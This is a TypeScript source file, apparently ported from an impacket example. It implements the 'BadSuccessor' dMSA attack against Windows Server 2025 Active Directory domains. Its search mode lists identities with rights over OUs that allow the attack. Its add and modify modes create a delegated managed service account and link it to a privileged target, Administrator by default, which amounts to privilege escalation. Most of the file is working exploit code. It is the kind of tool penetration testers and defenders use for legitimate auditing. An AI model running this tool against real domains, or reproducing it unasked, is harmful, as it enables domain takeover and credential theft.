#!/usr/bin/env node
/**
 * jspacket - badsuccessor
 *
 * dMSA (delegated Managed Service Account) exploitation tool for the
 * "BadSuccessor" attack primitive against Windows Server 2025 domain
 * controllers. Allows adding/deleting a dMSA in a specific OU, modifying a
 * dMSA's simulated predecessor account (msDS-ManagedAccountPrecededByLink),
 * and searching the domain for OUs/identities vulnerable to the attack
 * (CreateChild / GenericAll / WriteDACL / WriteOwner rights, or ownership,
 * over an OU).
 *
 * Search logic is based on AKAMAI's Get-BadSuccessorOUPermissions.ps1
 * (https://github.com/akamai/BadSuccessor/blob/main/Get-BadSuccessorOUPermissions.ps1).
 *
 * Python implementation by Ilya Yatsenko (@fulc2um). TypeScript port.
 */

import { Buffer } from 'node:buffer';
import { randomInt } from 'node:crypto';
import { parseArgs } from 'node:util';

import {
  parseTarget,
  init as initLogger,
  info,
  warning,
  error as logError,
  debug as logDebug,
  critical,
  getLevel,
  LogLevel,
  normalizeArgs,
  initProxy,
  BANNER,
} from '@impacket/examples';

import {
  LDAPConnection,
  LDAPSessionError,
  Scope,
  Operation,
  SR_SECURITY_DESCRIPTOR,
  ACL,
  ACE,
  ACCESS_ALLOWED_ACE,
  ACCESS_ALLOWED_OBJECT_ACE,
  ACCESS_MASK,
  LDAP_SID,
  createSDFlagsControl,
  type SearchResultEntry,
} from '@impacket/ldap';

import { binToString } from '@impacket/uuid';

const LDAP_SCOPE_BASE = Scope.baseObject;
const LDAP_SCOPE_SUBTREE = Scope.wholeSubtree;

// Relevant AD rights (access-mask bits) that could allow the BadSuccessor
// technique (creating/taking over a dMSA within an OU).
const RELEVANT_RIGHTS: Record<string, number> = {
  CreateChild: 0x00000001,
  GenericAll: 0x10000000,
  WriteDACL: 0x00040000,
  WriteOwner: 0x00080000,
};

// Object-type GUIDs relevant to dMSA creation rights on object-specific ACEs.
const RELEVANT_OBJECT_TYPES: Record<string, string> = {
  '00000000-0000-0000-0000-000000000000': 'All Objects',
  '0feb936f-47b3-49f2-9386-1dedc2c23765': 'msDS-DelegatedManagedServiceAccount',
};

// BUILTIN\Administrators, SYSTEM
const EXCLUDED_SIDS = new Set(['S-1-5-32-544', 'S-1-5-18']);
// Domain Admins, Enterprise Admins (relative to the domain SID)
const EXCLUDED_SUFFIXES = ['-512', '-519'];

const WELL_KNOWN_SIDS: Record<string, string> = {
  'S-1-1-0': 'Everyone',
  'S-1-5-11': 'NT AUTHORITY\\Authenticated Users',
  'S-1-5-32-544': 'BUILTIN\\Administrators',
  'S-1-5-32-545': 'BUILTIN\\Users',
  'S-1-5-32-546': 'BUILTIN\\Guests',
  'S-1-5-18': 'NT AUTHORITY\\SYSTEM',
  'S-1-5-19': 'NT AUTHORITY\\LOCAL SERVICE',
  'S-1-5-20': 'NT AUTHORITY\\NETWORK SERVICE',
  'S-1-3-0': 'CREATOR OWNER',
  'S-1-3-1': 'CREATOR GROUP',
  'S-1-5-9': 'NT AUTHORITY\\ENTERPRISE DOMAIN CONTROLLERS',
  'S-1-5-10': 'NT AUTHORITY\\SELF',
};

// ---------- entry-attribute helpers ----------

function findAttr(entry: SearchResultEntry, name: string) {
  return entry.attributes.find((a) => a.type.toLowerCase() === name.toLowerCase());
}

/** First value of a named attribute on a search entry, as a Buffer. */
function attrBuf(entry: SearchResultEntry, name: string): Buffer | null {
  const attr = findAttr(entry, name);
  if (!attr || attr.vals.length === 0) return null;
  const v = attr.vals[0]!;
  return Buffer.isBuffer(v) ? v : Buffer.from(v, 'binary');
}

/** First value of a named attribute on a search entry, as a UTF-8 string. */
function attrStr(entry: SearchResultEntry, name: string): string | null {
  const attr = findAttr(entry, name);
  if (!attr || attr.vals.length === 0) return null;
  const v = attr.vals[0]!;
  return Buffer.isBuffer(v) ? v.toString('utf8') : v;
}

/** All values of a named (possibly multi-valued) attribute, as strings. */
function attrStrs(entry: SearchResultEntry, name: string): string[] {
  const attr = findAttr(entry, name);
  if (!attr) return [];
  return attr.vals.map((v) => (Buffer.isBuffer(v) ? v.toString('utf8') : v));
}

function logRow(label: string, value: string): void {
  info(`${label.padEnd(30)} ${value}`);
}

// ---------- BADSUCCESSOR ----------

interface BadSuccessorArgs {
  dmsaName: string | null;
  targetOu: string | null;
  principalsAllowed: string | null;
  targetAccount: string;
  dnsHostname: string | null;
}

class BadSuccessor {
  private ldapConn: LDAPConnection;
  private baseDN: string;
  private domain: string;
  private username: string;

  private dmsaName: string | null;
  private targetOu: string | null;
  private principalsAllowed: string | null;
  private targetAccount: string;
  private dnsHostname: string | null;

  constructor(ldapConn: LDAPConnection, baseDN: string, domain: string, username: string, args: BadSuccessorArgs) {
    this.ldapConn = ldapConn;
    this.baseDN = baseDN;
    this.domain = domain;
    this.username = username;
    this.dmsaName = args.dmsaName;
    this.targetOu = args.targetOu;
    this.principalsAllowed = args.principalsAllowed;
    this.targetAccount = args.targetAccount;
    this.dnsHostname = args.dnsHostname;
  }

  async checkAccountExists(dn: string): Promise<boolean> {
    try {
      const entries = await this.ldapConn.search({
        searchBase: dn,
        scope: LDAP_SCOPE_BASE,
        searchFilter: '(objectClass=*)',
        attributes: ['cn'],
      });
      return entries.length > 0;
    } catch (e) {
      logDebug(`Error checking account existence: ${String(e)}`);
      // If we can't determine, assume it doesn't exist to avoid blocking operations
      return false;
    }
  }

  async searchOUs(): Promise<boolean> {
    try {
      info('Searching for OUs vulnerable to BadSuccessor attack...');

      const dcEntries = await this.ldapConn.search({
        searchBase: this.baseDN,
        scope: LDAP_SCOPE_SUBTREE,
        searchFilter:
          '(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
        attributes: ['operatingSystem', 'operatingSystemVersion'],
      });

      let prereqFlag = false;
      for (const entry of dcEntries) {
        const operatingSystem = attrStr(entry, 'operatingSystem');
        const operatingSystemVersion = attrStr(entry, 'operatingSystemVersion');
        if (!operatingSystem || !operatingSystemVersion) {
          logError(`Could not retrieve operating system information for Domain Controller: ${entry.objectName}`);
          continue;
        }

        if (operatingSystem.includes('Windows Server 2025') || operatingSystemVersion.includes('26100')) {
          info(`Found Windows Server 2025 Domain Controller: ${entry.objectName}`);
          prereqFlag = true;
          break;
        }
      }

      if (!prereqFlag) {
        info(
          'No Windows Server 2025 Domain Controllers found. This script requires at least one DC running Windows Server 2025.',
        );
        info('Resulting list of Identities/OUs will show Identities that have permissions to create objects in OUs.');
      }

      const ouEntries = await this.ldapConn.search({
        searchBase: this.baseDN,
        scope: LDAP_SCOPE_SUBTREE,
        searchFilter: '(objectClass=organizationalUnit)',
        attributes: ['distinguishedName', 'nTSecurityDescriptor'],
        searchControls: [createSDFlagsControl(0x5, true)],
      });
      info(`Found ${ouEntries.length} organizational units`);

      // Get domain SID for filtering excluded accounts
      let domainSid: string | null = null;
      try {
        const domainEntries = await this.ldapConn.search({
          searchBase: this.baseDN,
          scope: LDAP_SCOPE_BASE,
          searchFilter: '(objectClass=domain)',
          attributes: ['objectSid'],
        });
        if (domainEntries.length > 0) {
          const sidBuf = attrBuf(domainEntries[0]!, 'objectSid');
          domainSid = sidBuf ? new LDAP_SID(sidBuf).formatCanonical() : null;
        }
      } catch (e) {
        logError(`Failed to retrieve domain SID: ${String(e)}`);
        return false;
      }

      const allowedIdentities = new Map<string, string[]>();

      for (const entry of ouEntries) {
        try {
          const ouDn = entry.objectName;
          const sdData = attrBuf(entry, 'nTSecurityDescriptor');
          if (!sdData) continue;

          const sd = new SR_SECURITY_DESCRIPTOR(sdData);

          // Process DACL entries (ACEs)
          const dacl = sd.get('Dacl');
          if (dacl instanceof ACL) {
            for (const ace of dacl.aces) {
              // Ensure we parse and process both standard and object-specific ACEs
              const aceType = ace.get('AceType') as number;
              if (aceType !== ACCESS_ALLOWED_ACE.ACE_TYPE && aceType !== ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE) {
                continue;
              }

              const inner = ace.aceData as ACCESS_ALLOWED_ACE | ACCESS_ALLOWED_OBJECT_ACE;

              // Check if ACE has relevant rights
              const mask = ((inner.get('Mask') as ACCESS_MASK).get('Mask') as number) >>> 0;
              const hasRelevantRight = Object.values(RELEVANT_RIGHTS).some((right) => (mask & right) !== 0);
              if (!hasRelevantRight) continue;

              // Read and convert the object-type GUID (if present) correctly from raw bytes
              if (aceType === ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE) {
                const objTypeLen = (inner as ACCESS_ALLOWED_OBJECT_ACE).get('ObjectTypeLen') as number;
                if (objTypeLen !== 0) {
                  const objectType = (inner as ACCESS_ALLOWED_OBJECT_ACE).get('ObjectType') as Buffer;
                  const objectGuid = binToString(objectType).toLowerCase();
                  logDebug(objectGuid);
                  if (!(objectGuid in RELEVANT_OBJECT_TYPES)) continue;
                }
              }

              const sid = (inner.get('Sid') as LDAP_SID).formatCanonical();

              if (this.isExcludedSid(sid, domainSid)) continue;

              const identity = await this.resolveSidToName(sid);
              if (!allowedIdentities.has(identity)) allowedIdentities.set(identity, []);
              const ous = allowedIdentities.get(identity)!;
              if (!ous.includes(ouDn)) ous.push(ouDn);
            }
          }

          try {
            const ownerField = sd.get('OwnerSid');
            if (ownerField instanceof LDAP_SID) {
              const ownerSid = ownerField.formatCanonical();
              if (!this.isExcludedSid(ownerSid, domainSid)) {
                const identity = await this.resolveSidToName(ownerSid);
                if (!allowedIdentities.has(identity)) allowedIdentities.set(identity, []);
                const ous = allowedIdentities.get(identity)!;
                if (!ous.includes(ouDn)) ous.push(ouDn);
              }
            }
          } catch {
            // ignore
          }
        } catch {
          continue;
        }
      }

      if (allowedIdentities.size > 0) {
        info(`Found ${allowedIdentities.size} identities with BadSuccessor privileges:`);
        info('');
        info(`${'Identity'.padEnd(50)} Vulnerable OUs`);
        info(`${'-'.repeat(50)} ${'-'.repeat(30)}`);

        for (const [identity, ous] of allowedIdentities) {
          const ouList = `{${ous.join(', ')}}`;
          info(`${identity.slice(0, 50).padEnd(50)} ${ouList}`);
        }
      } else {
        info('No identities found with BadSuccessor privileges');
        info('');
        info(`${'Identity'.padEnd(50)} Vulnerable OUs`);
        info(`${'-'.repeat(50)} ${'-'.repeat(30)}`);
        info(`${'(none)'.padEnd(50)} (none)`);
      }
      return true;
    } catch (e) {
      logError(`BadSuccessor search failed: ${String(e)}`);
      return false;
    }
  }

  private isExcludedSid(sid: string, domainSid: string | null): boolean {
    if (EXCLUDED_SIDS.has(sid)) return true;

    if (domainSid && sid.startsWith(domainSid)) {
      for (const suffix of EXCLUDED_SUFFIXES) {
        if (sid.endsWith(suffix)) return true;
      }
    }

    return false;
  }

  private async resolveSidToName(sid: string): Promise<string> {
    try {
      if (WELL_KNOWN_SIDS[sid]) return WELL_KNOWN_SIDS[sid]!;

      const entries = await this.ldapConn.search({
        searchBase: this.baseDN,
        scope: LDAP_SCOPE_SUBTREE,
        searchFilter: `(objectSid=${sid})`,
        attributes: ['sAMAccountName'],
      });

      if (entries.length > 0) {
        const username = attrStr(entries[0]!, 'sAMAccountName');
        if (username) return `${this.domain.toUpperCase()}\\${username}`;
      }

      return sid;
    } catch (e) {
      logDebug(`Error resolving SID ${sid}: ${String(e)}`);
      return sid;
    }
  }

  private generateDmsaName(): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let suffix = '';
    for (let i = 0; i < 8; i++) suffix += chars[randomInt(chars.length)];
    return `dMSA-${suffix}`;
  }

  private buildSecurityDescriptor(sidString: string): Buffer | null {
    try {
      const sd = new SR_SECURITY_DESCRIPTOR();
      sd.set('Revision', 1);
      sd.set('Sbz1', 0);
      sd.set('Control', 32772);
      const owner = new LDAP_SID();
      owner.fromCanonical(sidString);
      sd.set('OwnerSid', owner);
      sd.set('GroupSid', Buffer.alloc(0));
      sd.set('Sacl', Buffer.alloc(0));

      const acl = new ACL();
      acl.set('AclRevision', 4);
      acl.set('Sbz1', 0);
      acl.set('Sbz2', 0);
      acl.aces = [];

      const nace1 = new ACE();
      nace1.set('AceType', ACCESS_ALLOWED_ACE.ACE_TYPE);
      nace1.set('AceFlags', 0x00);
      const acedata1 = new ACCESS_ALLOWED_ACE();
      const mask1 = new ACCESS_MASK();
      mask1.set('Mask', 0x000f01ff);
      acedata1.set('Mask', mask1);
      const sid1 = new LDAP_SID();
      sid1.fromCanonical(sidString);
      acedata1.set('Sid', sid1);
      nace1.aceData = acedata1;
      acl.aces.push(nace1);

      const nace2 = new ACE();
      nace2.set('AceType', ACCESS_ALLOWED_ACE.ACE_TYPE);
      nace2.set('AceFlags', 0x00);
      const acedata2 = new ACCESS_ALLOWED_ACE();
      const mask2 = new ACCESS_MASK();
      mask2.set('Mask', 0x10000000); // GenericAll
      acedata2.set('Mask', mask2);
      const sid2 = new LDAP_SID();
      sid2.fromCanonical(sidString);
      acedata2.set('Sid', sid2);
      nace2.aceData = acedata2;
      acl.aces.push(nace2);

      sd.set('Dacl', acl);
      return sd.getData();
    } catch (e) {
      logDebug(`Error building security descriptor: ${String(e)}`);
      return null;
    }
  }

  async addDmsa(): Promise<boolean> {
    try {
      if (!this.dmsaName) this.dmsaName = this.generateDmsaName();

      if (!this.targetOu) {
        logError('Target OU is required for dMSA creation. Use -target-ou parameter.');
        return false;
      }

      const dmsaDn = `CN=${this.dmsaName},${this.targetOu}`;
      if (await this.checkAccountExists(dmsaDn)) {
        logError(`dMSA account already exists: ${dmsaDn}`);
        return false;
      }

      const principalsAllowed = this.principalsAllowed || this.username;
      const targetAccount = this.targetAccount || 'Administrator';

      let dnsHostname = this.dnsHostname || `${this.dmsaName.toLowerCase()}.${this.domain}`;
      // Validate DNS hostname format
      if (!dnsHostname || !dnsHostname.includes('.')) {
        dnsHostname = `${this.dmsaName.toLowerCase()}.${this.domain}`;
      }

      const attributes: Record<string, string | Buffer> = {
        cn: this.dmsaName,
        sAMAccountName: `${this.dmsaName}$`,
        dNSHostName: dnsHostname,
        userAccountControl: '4096',
        'msDS-ManagedPasswordInterval': '30',
        'msDS-DelegatedMSAState': '2',
        'msDS-SupportedEncryptionTypes': '28',
        accountExpires: '9223372036854775807',
      };

      let groupMsaMembership: Buffer | null = null;
      try {
        const entries = await this.ldapConn.search({
          searchBase: this.baseDN,
          scope: LDAP_SCOPE_SUBTREE,
          searchFilter: `(&(objectClass=user)(sAMAccountName=${principalsAllowed}))`,
          attributes: ['objectSid'],
        });
        if (entries.length > 0) {
          const sidBuf = attrBuf(entries[0]!, 'objectSid');
          if (sidBuf) {
            const userSid = new LDAP_SID(sidBuf).formatCanonical();
            const descriptor = this.buildSecurityDescriptor(userSid);
            if (descriptor) {
              groupMsaMembership = descriptor;
              attributes['nTSecurityDescriptor'] = descriptor;
            }
          }
        }
      } catch (e) {
        logDebug(`Error building MSA membership: ${String(e)}`);
        return false;
      }

      if (groupMsaMembership) {
        attributes['msDS-GroupMSAMembership'] = groupMsaMembership;
      }

      let targetDn: string | null = null;
      const entries = await this.ldapConn.search({
        searchBase: this.baseDN,
        scope: LDAP_SCOPE_SUBTREE,
        searchFilter: `(&(objectClass=*)(sAMAccountName=${targetAccount}))`,
        attributes: ['distinguishedName', 'objectClass'],
      });

      if (entries.length > 0) {
        for (const entry of entries) {
          const objectClasses = attrStrs(entry, 'objectClass').map((v) => v.toLowerCase());
          if (objectClasses.includes('user') || objectClasses.includes('computer')) {
            targetDn = entry.objectName;
            break;
          }
        }
        if (targetDn === null) targetDn = entries[0]!.objectName;

        if (targetDn) attributes['msDS-ManagedAccountPrecededByLink'] = targetDn;
      } else {
        logError(`Target account not found: ${targetAccount}`);
        return false;
      }

      const attrArray = [
        { type: 'objectClass', vals: ['msDS-DelegatedManagedServiceAccount'] },
        ...Object.entries(attributes).map(([type, val]) => ({ type, vals: [val] })),
      ];

      await this.ldapConn.add(dmsaDn, attrArray);

      info('');
      info(`${'-'.repeat(30)} ${'-'.repeat(30)}`);
      logRow('dMSA Name:', `${this.dmsaName}$`);
      logRow('DNS Hostname:', dnsHostname);
      logRow('Migration status: ', '2');
      logRow('Principals Allowed:', principalsAllowed);
      logRow('Target Account:', targetAccount);
      return true;
    } catch (e) {
      if (e instanceof LDAPSessionError) logError(`dMSA creation failed: ${e.getErrorString()}`);
      else logError(`dMSA creation failed: ${String(e)}`);
      return false;
    }
  }

  async deleteDmsa(): Promise<boolean> {
    try {
      if (!this.dmsaName) {
        logError('dMSA name is required for deletion. Use -dmsa-name parameter.');
        return false;
      }

      if (!this.targetOu) {
        logError('Target OU is required for dMSA deletion. Use -target-ou parameter.');
        return false;
      }

      const dmsaDn = `CN=${this.dmsaName},${this.targetOu}`;
      if (!(await this.checkAccountExists(dmsaDn))) {
        logError(`dMSA account does not exist: ${dmsaDn}`);
        return false;
      }

      let success = true;
      try {
        await this.ldapConn.delete(dmsaDn);
      } catch (e) {
        if (e instanceof LDAPSessionError) logError(`Could not delete object: ${e.getErrorString()}`);
        success = false;
      }

      info('');
      logRow('dMSA Deletion Results', '');
      info(`${'-'.repeat(30)} ${'-'.repeat(30)}`);
      logRow('dMSA Name:', `${this.dmsaName}$`);
      logRow('Status:', success ? 'SUCCESS' : 'FAILED');

      return success;
    } catch (e) {
      logError(`dMSA deletion failed: ${String(e)}`);
      return false;
    }
  }

  async modifyDmsa(): Promise<boolean> {
    try {
      const dmsaDn = `CN=${this.dmsaName},${this.targetOu}`;

      if (!(await this.checkAccountExists(dmsaDn))) {
        logError(`dMSA account does not exist: ${dmsaDn}`);
        return false;
      }

      // Get current target account value
      const entries = await this.ldapConn.search({
        searchBase: dmsaDn,
        scope: LDAP_SCOPE_BASE,
        searchFilter: '(objectClass=msDS-DelegatedManagedServiceAccount)',
        attributes: ['msDS-ManagedAccountPrecededByLink'],
      });

      let currentTargetDn: string | null = null;
      if (entries.length > 0) {
        currentTargetDn = attrStr(entries[0]!, 'msDS-ManagedAccountPrecededByLink');
      }

      const targetEntries = await this.ldapConn.search({
        searchBase: this.baseDN,
        scope: LDAP_SCOPE_SUBTREE,
        searchFilter: `(&(objectClass=*)(sAMAccountName=${this.targetAccount}))`,
        attributes: ['distinguishedName', 'objectClass'],
      });

      if (targetEntries.length === 0) {
        logError(`Target account not found: ${this.targetAccount}`);
        return false;
      }

      let targetDn: string | null = null;
      for (const entry of targetEntries) {
        const objectClasses = attrStrs(entry, 'objectClass').map((v) => v.toLowerCase());
        if (objectClasses.includes('user') || objectClasses.includes('computer')) {
          targetDn = entry.objectName;
          break;
        }
      }
      if (!targetDn) targetDn = targetEntries[0]!.objectName;

      if (currentTargetDn === targetDn) {
        info(`Target account is already set to: ${targetDn}`);
        info('No modifications needed.');
        return true;
      }

      try {
        await this.ldapConn.modify(dmsaDn, [
          {
            operation: Operation.replace,
            modification: { type: 'msDS-ManagedAccountPrecededByLink', vals: [targetDn] },
          },
        ]);
        info(`dMSA target account modified: ${currentTargetDn ?? '(not set)'} -> ${targetDn}`);
        return true;
      } catch (e) {
        if (e instanceof LDAPSessionError) logError(`Could not modify object: ${e.getErrorString()}`);
        else logError(`Error modifying dMSA: ${String(e)}`);
        return false;
      }
    } catch (e) {
      logError(`Error modifying dMSA: ${String(e)}`);
      return false;
    }
  }
}

// ---------- CLI ----------

function usage(): never {
  console.log(`dMSA exploitation tool.

usage: badsuccessor [-h] [-dmsa-name dmsa_name] [-action {add,delete,modify,search}]
                    [-target-ou OU_DN] [-principals-allowed USERNAME]
                    [-target-account USERNAME] [-dns-hostname HOSTNAME]
                    [-ts] [-debug] [-method {LDAP,LDAPS}] [-port {389,636}]
                    [-baseDN DC=test,DC=local]
                    [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                    [-dc-host hostname] [-dc-ip ip]
                    [domain/]username[:password]

positional arguments:
  account               Account used to authenticate to DC.

options:
  -h, --help            show this help message and exit
  -dmsa-name dmsa_name  Name of dMSA to add. If omitted, a random
                        dMSA-[A-Z0-9]{8} will be used.
  -action {add,delete,modify,search}
                        Action to perform: add (requires -target-ou),
                        delete (requires -dmsa-name, -target-ou), modify
                        (requires -dmsa-name, -target-ou and
                        -target-account), or search a dMSA. (default: search)
  -target-ou OU_DN      Specific OU to check for dMSA creation capabilities
                        (e.g., "OU=weakOU,DC=domain,DC=local")
  -principals-allowed USERNAME
                        Username allowed to retrieve the managed password.
                        If omitted, current username will be used.
  -target-account USERNAME
                        Target user or computer account DN to set for
                        msDS-ManagedAccountPrecededByLink (can target Domain
                        Controllers, Domain Admins, Protected Users, etc.)
                        (default: Administrator)
  -dns-hostname HOSTNAME
                        DNS hostname for the dMSA. If omitted, will be
                        generated as dmsaname.domain.
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -method {LDAP,LDAPS}  Method of adding the computer. LDAPS has some
                        certificate requirements and isn't always available.
                        (default: LDAPS)
  -port {389,636}       Destination port to connect to. LDAP defaults to
                        389, LDAPS to 636.

LDAP:
  -baseDN DC=test,DC=local
                        Set baseDN for LDAP. If ommited, the domain part
                        (FQDN) specified in the account parameter will be
                        used.

authentication:
  -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on account
                        parameters. If valid credentials cannot be found, it
                        will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or
                        256 bits)
  -dc-host hostname     Hostname of the domain controller to use. If
                        ommited, the domain part (FQDN) specified in the
                        account parameter will be used
  -dc-ip ip             IP of the domain controller to use. Useful if you
                        can't translate the FQDN.
`);
  process.exit(1);
}

async function main(): Promise<void> {
  const argv = normalizeArgs(process.argv.slice(2));
  if (argv.length === 0) usage();

  console.log(BANNER + '\n');

  let values: any;
  let positionals: string[];
  try {
    ({ values, positionals } = parseArgs({
      args: argv,
      allowPositionals: true,
      options: {
        'dmsa-name': { type: 'string' },
        action: { type: 'string', default: 'search' },
        'target-ou': { type: 'string' },
        'principals-allowed': { type: 'string' },
        'target-account': { type: 'string', default: 'Administrator' },
        'dns-hostname': { type: 'string' },
        ts: { type: 'boolean', default: false },
        debug: { type: 'boolean', default: false },
        method: { type: 'string', default: 'LDAPS' },
        port: { type: 'string' },
        baseDN: { type: 'string' },
        hashes: { type: 'string' },
        'no-pass': { type: 'boolean', default: false },
        k: { type: 'boolean', default: false },
        aesKey: { type: 'string' },
        'dc-host': { type: 'string' },
        'dc-ip': { type: 'string' },
        proxy: { type: 'string' },
        help: { type: 'boolean', short: 'h', default: false },
      },
    }));
  } catch (e) {
    console.error(`[-] ${(e as Error).message}`);
    usage();
  }

  if (values.help || positionals.length < 1) usage();

  const action = (values.action ?? 'search') as string;
  const validActions = ['add', 'delete', 'modify', 'search'];
  if (!validActions.includes(action)) {
    critical(`argument -action: invalid choice: '${action}' (choose from 'add', 'delete', 'modify', 'search')`);
    process.exit(1);
  }

  const method = (values.method ?? 'LDAPS') as string;
  if (method !== 'LDAP' && method !== 'LDAPS') {
    critical(`argument -method: invalid choice: '${method}' (choose from 'LDAP', 'LDAPS')`);
    process.exit(1);
  }

  let port: number | null = null;
  if (values.port) {
    port = Number.parseInt(values.port, 10);
    if (port !== 389 && port !== 636) {
      critical(`argument -port: invalid choice: '${values.port}' (choose from 389, 636)`);
      process.exit(1);
    }
  }

  // Mirror impacket's post-parse required-argument validation per action.
  if (action === 'add') {
    const missing: string[] = [];
    if (!values['target-ou']) missing.push('-target-ou');
    if (missing.length > 0) {
      critical(`Action "add" requires the following arguments: ${missing.join(', ')}`);
      process.exit(1);
    }
  } else if (action === 'delete') {
    const missing: string[] = [];
    if (!values['dmsa-name']) missing.push('-dmsa-name');
    if (!values['target-ou']) missing.push('-target-ou');
    if (missing.length > 0) {
      critical(`Action "delete" requires the following arguments: ${missing.join(', ')}`);
      process.exit(1);
    }
  } else if (action === 'modify') {
    const missing: string[] = [];
    if (!values['dmsa-name']) missing.push('-dmsa-name');
    if (!values['target-ou']) missing.push('-target-ou');
    if (!values['target-account']) missing.push('-target-account');
    if (missing.length > 0) {
      critical(`Action "modify" requires the following arguments: ${missing.join(', ')}`);
      process.exit(1);
    }
  }

  initLogger({ ts: values.ts, debug: values.debug });
  initProxy(values.proxy);

  const [domain, username, password, remoteName] = parseTarget(positionals[0]!);
  if (domain === '') {
    critical('Domain should be specified!');
    process.exit(1);
  }

  let lmhash = '';
  let nthash = '';
  if (values.hashes) {
    const parts = values.hashes.split(':');
    lmhash = parts[0] ?? '';
    nthash = parts[1] ?? '';
    if (lmhash === '') lmhash = 'AAD3B435B51404EEAAD3B435B51404EE';
  }

  let doKerberos = values.k ?? false;
  if (values.aesKey) doKerberos = true;

  if (doKerberos && !values['dc-host']) {
    critical('Kerberos auth requires DNS name of the target DC. Use -dc-host.');
    process.exit(1);
  }

  if (method === 'LDAPS' && !domain.includes('.')) {
    warning(`'${domain}' doesn't look like a FQDN. Generating baseDN will probably fail.`);
  }

  const kdcIp = values['dc-ip'] ?? null;
  const kdcHost = values['dc-host'] ?? null;

  if (!kdcHost && !domain.includes('.')) {
    warning(`No DC host set and '${domain}' doesn't look like a FQDN. DNS resolution of short names will probably fail.`);
  }

  const baseDN =
    values.baseDN ??
    domain
      .split('.')
      .map((p) => `dc=${p}`)
      .join(',');

  const targetHost = kdcHost ?? kdcIp ?? (remoteName || domain);
  const scheme = method === 'LDAPS' ? 'ldaps' : 'ldap';

  if (port !== null) {
    const defaultPort = scheme === 'ldaps' ? 636 : 389;
    if (port !== defaultPort) {
      logDebug(
        `-port ${port} requested, but the LDAP transport always uses the scheme-derived port (${defaultPort}) for -method ${method}`,
      );
    }
  }

  logDebug(`Connecting to ${scheme}://${targetHost} (baseDN: ${baseDN})`);

  const ldapConn = new LDAPConnection({
    url: `${scheme}://${targetHost}`,
    baseDN,
    dstIp: kdcIp ?? undefined,
    ...(doKerberos ? { signing: false } : {}),
  });

  try {
    await ldapConn.connect();
    if (doKerberos) {
      await ldapConn.kerberosLogin({
        user: username,
        password,
        domain,
        lmhash,
        nthash,
        aesKey: values.aesKey ?? '',
        kdcHost,
      });
    } else {
      await ldapConn.login({ user: username, password, domain, lmhash, nthash });
    }
    info(`Connected to ${targetHost} as ${domain}\\${username}`);

    const args: BadSuccessorArgs = {
      dmsaName: values['dmsa-name'] ?? null,
      targetOu: values['target-ou'] ?? null,
      principalsAllowed: values['principals-allowed'] ?? null,
      targetAccount: values['target-account'] ?? 'Administrator',
      dnsHostname: values['dns-hostname'] ?? null,
    };

    const badSuccessor = new BadSuccessor(ldapConn, baseDN, domain, username, args);

    if (action === 'add') await badSuccessor.addDmsa();
    else if (action === 'delete') await badSuccessor.deleteDmsa();
    else if (action === 'modify') await badSuccessor.modifyDmsa();
    else if (action === 'search') await badSuccessor.searchOUs();

    ldapConn.close();
  } catch (e) {
    if (getLevel() === LogLevel.DEBUG) console.error(e);
    logError(String(e));
  }
}

main();
